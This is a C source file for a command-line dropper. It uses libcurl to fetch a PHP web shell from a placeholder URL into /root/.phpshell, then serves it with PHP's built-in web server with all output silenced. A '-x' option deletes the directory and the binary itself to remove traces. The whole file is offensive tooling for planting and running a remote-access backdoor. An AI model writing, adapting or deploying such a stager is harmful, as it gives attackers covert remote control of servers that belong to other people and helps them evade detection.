/*
I found this when I was organizing stuff on my hard drive.

Compile with -lcurl
What does this thing do? It downloads a php shell from provided URL and spawns a php instance. 

DEFAULT DIRECTORY: /root/.phpshell
Change to suit your needs
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <curl/curl.h>

void clr_red()
{
   printf("\033[0;31m"); 
}
void clr_green() 
{
    printf("\033[0;32m");
} 
void resetcolor()
{
    printf("\033[0m");
}

int isphpdir() {
    DIR* dir = opendir("/root/.phpshell");
    if (dir)
    {
        closedir(dir);
    }
    else if (ENOENT == errno)
    {
        mkdir("/root/.phpshell", ACCESSPERMS);
    }
    return 0;
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void downloader(const char* url, const char* outfilename) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        /* always cleanup */
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

int check_if_index_exists() {
	FILE *fp;
    int status;
    char path[PATH_MAX];
    char phppath[] = "/root/.phpshell/index.php";
    if (access(phppath, F_OK) != -1) {
    	clr_green();
    	printf("[✔] index.php found!\n");
    	return 0;
    } else {
    	clr_red();
    	printf("[✘] index.php not found!\n");
    	resetcolor();
    	return 1;
    }
}

void spawnphp(const char* phpspawn) {
    FILE *fp;
    int status;
    char path[PATH_MAX];

    fp = popen(phpspawn,"r");
    if (fp == NULL) {
        /*SHOULD NEVER GET HERE*/
        clr_red();
        printf("[✘] COULD NOT SPAWN PHP\n");
        resetcolor();
        exit(0);
    }
}



int main(int argc, char const *argv[])
{
	if (argc == 2) {
		if (strcmp(argv[1], "-x") == 0) {
			system("rm -rf /root/.phpshell 2> /dev/null");
			return unlink(argv[0]);
            //SHOULD NEVER GET DOWN BELOW
            exit(0);
		}
	}

	isphpdir();
	/*
	*****************
	*** EDIT THIS ***
	*****************
	downloader("{URL}","DEST_PATH");
	spawnphp(); - Replace {127.0.0.1:80}
	*/
	downloader("http://example.com/shell","/root/.phpshell/index.php");
	check_if_index_exists();
	spawnphp("php -q -S {127.0.0.1:80} -t /root/.phpshell/ > /dev/null 2>&1");
	return 0;
}


